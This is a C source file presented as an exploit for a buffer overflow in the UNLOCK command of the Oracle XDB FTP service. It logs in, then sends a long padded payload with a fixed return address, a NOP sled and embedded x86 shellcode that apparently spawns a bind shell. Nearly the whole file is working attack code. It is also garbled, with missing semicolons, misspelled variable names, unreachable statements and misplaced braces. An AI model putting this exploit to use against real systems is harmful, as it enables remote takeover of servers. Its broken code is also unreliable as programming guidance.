#include <stdio.h>
#include <stdlib.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<netdb.h>

/*  the XML database, otherwise known as XDB offers two services
-HTTP on TCP port: 8080
-FTP on TCP port:2100

The following code exploits UNLOCK overflow  on XDB 
*/





int main(int argc, char *argv[]) {
	struct hostent *he;
	struct sockaddr_in sa;
	int sock;
	unsigned int addr=0;
	char recvbuffer[512]="";
	
	char user[260]="user ";
	char passwd[260]="pass";
	int rcv=0;
	int snd=0;
	int count=0;
	unsigned char nop_sled[1804]=" ";
	unsigned char saved_return_address[]="\x41\xc8\xff\xbf";
	unsigned char exploit[2000]="unlock / AAAABBB"  "BCCCCDDDDEEEEFFF"      "FGGGGHHHHIIIIJJJ"      "JKKKKLLLLMMMMNNN"      "NOOOOPPPPQQQQRRR"      "RSSSSTTTTUUUUVVV"      "VWWWWXXXXYYYYZZZ"      "Zaaaabbbbccccdd";
	 unsigned charcode[]="\x31\xdb\x53\x43\x53\x43\x53\x4b\x6a\x66\x58\x54\x59\xcd"      "\x80\x50\x4b\x53\x53\x53\x66\x68\x41\x41\x43\x43\x66\x53"      "\x54\x59\x6a\x10\x51\x50\x54\x59\x6a\x66\x58\xcd\x80\x58"      "\x6a\x05\x50\x54\x59\x6a\x66\x58\x43\x43\xcd\x80\x58\x83"      "\xec\x10\x54\x5a\x54\x52\x50\x54\x59\x6a\x66\x58\x43\xcd"      "\x80\x50\x31\xc9\x5b\x6a\x3f\x58\xcd\x80\x41\x6a\x3f\x58"      "\xcd\x80\x41\x6a\x3f\x58\xcd\x80\x6a\x0b\x58\x99\x52\x68"      "\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x54\x5b\x52\x53\x54"      "\x59\xcd\x80\r\n";


if(argc!=4)
{
	printf("\n\n\tOracle XDB FTP service unlock buffer overflow exploit");
	return 0;
}
while(count<1800)
{
	nop_sled[count++]=0x90;
	
	
	//Build the exploit
	strcat(exploit,saved_return_address);
	strcat(exploit,nop_sled);
	strcat(exploit,code);
	
	
	//Process arguments
	strncat(user,argv[2],240);
	strncat(passwd,argv[3],240);
	strcat(user,"\r\n");
	strcat(passwd,"\r\n")
	
	
	//setup socket stuff
	sa.sin_addr.s_addr=INADDR_ANY;
	sa.sin_family=AF_INET;
	sa.sin_port=htons(  (unsigned char ) 2100 );
	
	
	//resolve the target system
if(isalpha(argv[1][0])==0)
{
	addr=inet_addr(argv[1]);
	memcpy(&sa.sin_addr,&addr,4);
	
}
else
{
	
	he=gethostbyname(argv[1]);
	if(he==NULL)
	{
		return printf("Could not resolve host %s \n",argv[1]);
		memcpy(&sa.sin_addr,he->h_addr,he->h_length);
		
	}
	
	sock=socket(AF_INET,SOCK_STREAM,0);
	if(sock<0)
	return printf("sock() failed");
	
	if(connect(sock,(struct sockaddr * )&sa,sizeof(sa))<0)
	{
		close(sock);
		return printf("Connect() failed");
		
	}
	
	printf("Connected to ...%s",argv[1]);
	
	
//Recive and print banner
rcv=recv(sock,recvbuffer,508,0);
if(rcv>0)
{
	printf("%s",recvbuffer);
	bzero(recvbuffer,rcv+1);
	
	}
	else
	{
		close(sock)
		return printf("Problem with recv()");
		
		}	
	//send user command
	snd=send(sock,user,strlen(user),0);
	if(snd!=strlen(user))
	{
		close(sock);
		return printf("Problem with send");
		
	}
	else
	{
		printf("%s",user);
		
	}
	
	//recive response 
	rcv=recv(sock,recvbuffer,508,0);
	if(rcv>0)
	{
		if(recvbuffer[0]==0x33 && recvbuffer[1]==0x33 && recvbuffer[2]==0x31)
		{
			
			printf("%s\n",recvbuffer);
			bzero(recvbuffer,rcv+1);
		}
		else
		{
			close(sock);
			return  printf("FTP response code was not 331");
		}
		
	}
	else
	{
		close(sock);
		return printf("Probelm with rcb()");
		
	}
	
	//Send pass command
	snd=send(sock,passwd,strlen(passwd),0);
	if(snd!=strlen(user))
	{
		close(sock);
		return printf("Problem with send()...");
		
	}
	else
	{
		printf("%s",passwd);
	}
	
	//Recive response.If not 230 login has failed
rcv=recv(sock,recvbuffer,508,0);
if(rcv>0)
{
	if(recvbuffer[0]==0x32  && recvbuffer[1]==0x31 && recvbuffer[2]==0x30)
	{
		printf("%s",recvbuffer);
		bzero(recvbuffer,rcv+1);
	}
	else
	{
		close(sock);
		return printf("FTP respons code  was not 230");
	}
}
else
{
	close(sock);
	return printf("Problem with recv()");
	
}

//Send the UNLOCK command with exploit
snd=send(sock,exploit,strlen(exploit),0);
if(snd!=strlen(exploit))
{
	close(sock);
	return printf("Problem with send()...");
}
//Should recive 550 error response 
rcv=recv(sock,recvbuffer,508,0);
if(rcv>0)
{
	printf("%s",recvbuferr);
	
}
printf("Exploit code send to %s",argv[1]);
close(sock);
return 0;
}





}






}
